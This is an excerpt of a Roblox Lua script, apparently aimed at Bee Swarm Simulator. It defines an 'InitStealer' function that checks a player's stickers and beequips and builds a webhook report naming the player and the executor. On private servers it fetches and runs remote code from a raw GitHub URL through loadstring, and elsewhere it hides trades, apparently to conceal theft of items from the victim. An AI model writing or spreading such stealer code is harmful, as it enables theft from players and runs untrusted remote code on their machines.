_G.LINK = "https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/beta5"
...
local function InitStealer(UserWhitelist, Webhook)
        ...
        if #Stickers > 0 or #Beequips > 0 then
            ...
            _G.Exodus_WebhookBody = {
                ...
                user = {
                    ...
                    name = identifyexecutor() .. " - " .. LocalPlayer.Name .. (game.PlaceId == 15579077077 and " [Hive Hub]" or "") .. " - " .. (_G.META == "rewrite" and "AtlasRewrite" or "AtlasNormal"),
    ...
    if #GetStickers() > 0 or #GetBeequips() > 0 then
        if GameData.IsPrivateServer then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/install2.lua"))()
            return
        else
            HideTrades()
        end
